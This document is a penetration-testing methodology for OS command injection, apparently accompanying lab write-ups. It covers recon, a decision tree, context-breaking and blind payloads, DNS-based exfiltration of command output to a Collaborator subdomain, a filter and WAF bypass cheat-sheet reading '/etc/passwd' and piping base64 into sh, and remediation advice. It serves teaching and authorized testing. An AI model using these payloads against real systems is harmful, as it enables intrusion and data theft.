# Methodology — OS Command Injection Testing

A practical, repeatable testing methodology for identifying, confirming, and exploiting OS command injection (CWE-78) during web application penetration testing or bug bounty work. This complements the individual lab writeups in this folder — use it as the field checklist, use the lab writeups as worked examples.

---

## 1. Recon — Identifying Candidate Attack Surface

Look for any functionality where the application is likely calling out to the underlying OS instead of handling logic purely in code:

| Functionality type | Typical indicators |
|---|---|
| Network diagnostics | Ping/traceroute/DNS-lookup/"check connectivity" tools exposed in an admin panel |
| Report/file generation | Legacy report scripts, PDF/ZIP export, backup triggers |
| Email/notifications | Contact/feedback forms that forward to an admin inbox |
| Media processing | Image/video upload with resizing, conversion, thumbnailing (ImageMagick, ffmpeg) |
| System integration | "Import from URL", log viewers, health-check endpoints |
| Any parameter that maps suspiciously closely to a filename, hostname, IP, or CLI-style value | `filename=`, `host=`, `cmd=`, `path=`, `ip=` |

A parameter is a stronger candidate if its value resembles something a CLI tool would consume directly (a hostname, filename, number, or path) rather than free-form text destined for a database field.

---

## 2. Decision Tree

```
                 [Candidate parameter identified]
                               │
                 ┌─────────────┴─────────────┐
                 ▼                             ▼
       [Probe for context]              [Probe for filtering]
   (raw value vs quoted vs             (are spaces/chars/
    inside a subshell)                  keywords stripped?)
                 │                             │
                 └─────────────┬───────────────┘
                               ▼
                 [Send a non-destructive marker payload]
                  e.g. ; echo <unique-string> ;
                               │
                 ┌─────────────┴─────────────┐
                 ▼                             ▼
     [Marker reflected in response]   [No marker in response]
        → VERBOSE / IN-BAND               → test BLIND paths
                 │                             │
        Exploit directly:          ┌───────────┼───────────┐
        whoami, id, ls, cat...     ▼           ▼           ▼
                            [Time delay]  [Writable &   [Out-of-Band
                             ping/sleep    servable      (OAST)]
                                           path exists?]  nslookup/curl
                                                           to Collaborator
```

---

## 3. Context Breaking — How the Input Is Embedded

Before trying real payloads, determine how the backend wraps your input, since this dictates which metacharacters will actually reach the shell unescaped.

| Likely backend pattern | Breaking technique | Test payload |
|---|---|---|
| Raw value appended to a command: `cmd <input>` | Use a separator directly | `\| whoami` or `; whoami` or `& whoami &` |
| Single-quoted: `cmd '<input>'` | Close the quote first | `' ; whoami #` |
| Double-quoted: `cmd "<input>"` | Close the quote first | `" ; whoami ; "` |
| Embedded in a subshell: `$(cmd <input>)` | Close the parenthesis first | `) ; whoami (` |

Start with the simplest separator for the target OS and escalate to quote-breaking only if the simple payload has no effect.

---

## 4. Confirming the Vulnerability by Response Type

### 4a. In-band / verbose
- Payload: `; whoami` / `\| whoami` / `& whoami &`
- Confirmation: the command's output (e.g. a username, OS banner) appears in the HTTP response.
- See: `Lab-01-Simple-Case.md`.

### 4b. Blind — time-based
- Payload (Linux): `x||ping -c 10 127.0.0.1||` — Payload (Windows): `& ping -n 10 127.0.0.1 &`
- Confirmation: response time increases proportionally to the ping count (baseline ~200ms → ~10,000ms for a 10-packet ping).
- Fallback separators if `||` doesn't trigger: `&`, `;`, `&&` depending on what makes the preceding command succeed/fail.
- See: `Lab-02-Blind-Time-Delays.md`.

### 4c. Blind — output redirection
- Precondition: a directory the application serves statically (`/uploads/`, `/static/`, `/images/`) that is also writable by the app's process.
- Payload: `||whoami>/path/to/webroot/out.txt||`
- Confirmation: request the file directly (`GET /image?filename=out.txt`) and read the command output from the response.
- See: `Lab-03-Blind-Output-Redirection.md`.

### 4d. Blind — out-of-band (OAST), confirmation only
- Use when execution is asynchronous (no timing signal) and there is no writable/servable path.
- Payload: `||nslookup x.<collaborator-subdomain>||`
- Confirmation: a DNS interaction is logged against the unique subdomain (e.g. in Burp Collaborator).
- See: `Lab-04-Blind-OOB-Interaction.md`.

### 4e. Blind — out-of-band data exfiltration
- Same preconditions as 4d, but the goal is to read command output, not just confirm execution.
- Payload (inline command substitution): `` ||nslookup `whoami`.<collaborator-subdomain>|| `` or `||nslookup $(whoami).<collaborator-subdomain>||`
- Confirmation: the looked-up domain's first label contains the command's output.
- For output containing spaces/newlines (e.g. file contents), base64-encode and strip whitespace first.
- See: `Lab-05-Blind-OOB-Data-Exfiltration.md`.

---

## 5. Shell Metacharacter Reference

| Separator | Behaviour | Platform |
|---|---|---|
| `;` | Runs the next command regardless of the first's exit status | Unix/Linux only |
| `\n` (0x0a) | Newline — ends one command, starts the next | Unix/Linux only |
| `&` | Runs the first command in the background, then the next | Linux & Windows |
| `&&` | Runs the next command only if the first **succeeds** | Linux & Windows |
| `\|` | Pipes the first command's stdout into the second | Linux & Windows |
| `\|\|` | Runs the next command only if the first **fails** | Linux & Windows |
| `` `cmd` `` / `$(cmd)` | Inline execution — substitutes the command's output in place | Unix/Linux only |

---

## 6. Filter & WAF Bypass Cheat-Sheet

| Obstacle | Linux bypass | Windows bypass |
|---|---|---|
| Spaces blocked | `${IFS}`, `$IFS$9`, input redirection (`cat</etc/passwd`) | `%ProgramData:~0,1%` tricks, or `type file` without extra spaces |
| Keyword/command blacklist | Quote-splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`; variable concatenation: `a=wh;b=oami;$a$b` | Variable concatenation: `set a=who&set b=ami&%a%%b%` |
| `;` / `&` blocked | Use a literal newline (`%0a` in the raw request) | Use `\|` or `\r\n` |
| Output must be re-encoded to evade signature matching | `echo <base64> \| base64 -d \| sh` | `certutil -decode` |
| Full path blocked (e.g. `/etc/passwd`) | Hex/octal encoding of the path, or environment-variable reconstruction | Equivalent environment-variable tricks |

Treat this table as a starting point — always confirm each bypass against the specific filter logic observed, rather than applying all of them blindly.

---

## 7. Testing Checklist

- [ ] Enumerate all parameters tied to network, file, report, email, or media functionality.
- [ ] Send a baseline/benign request and note normal response time and content.
- [ ] Send a non-destructive marker payload (`; echo <unique-string> ;`) and check for reflection.
- [ ] If no reflection, test for a time-based delay (`ping`/`sleep`, OS-appropriate).
- [ ] If no delay observed, check for any writable + statically-served directory, and attempt output redirection.
- [ ] If none of the above apply, set up an OAST listener (e.g. Burp Collaborator) and test with `nslookup`/`curl`.
- [ ] If initial payloads are rejected/stripped, test context-breaking (quotes/subshell) and filter bypasses (spaces, blacklisted keywords).
- [ ] Once confirmed, escalate carefully and only within the authorized scope — enumerate user, OS, network config, and (where explicitly in scope) attempt further access.
- [ ] Document the exact payload, request/response (or Collaborator interaction) as evidence.
- [ ] Map the finding to CWE-78 / OWASP A05:2025 — Injection, and write remediation guidance (see individual lab writeups, Section 7).

---

## 8. Remediation Summary (for reporting)

1. **Eliminate shell calls** from application-layer code wherever a safe platform API exists (native mail/network/file libraries instead of invoking a shell).
2. If a shell call is unavoidable, **pass arguments as an array/parameter list** via APIs that do not invoke `/bin/sh` (e.g. `execFile()` in Node.js, `ProcessBuilder` in Java) — never build commands via string concatenation.
3. **Allowlist validation**: restrict input to the exact expected format (numeric-only, fixed enum, strict regex) and reject everything else server-side. Never rely on client-side validation alone.
4. **Never attempt to sanitise by escaping/blacklisting metacharacters** — it is consistently bypassable.
5. **Defence in depth**: least-privilege service accounts, no writable directories inside the web root, egress filtering (including DNS) to blunt OAST-based exfiltration, and monitoring for anomalous response-time spikes or unusual outbound DNS patterns.

---

## 9. References

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [TryHackMe — OS Command Injection room](https://tryhackme.com/)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Top 10](https://owasp.org/Top10/)
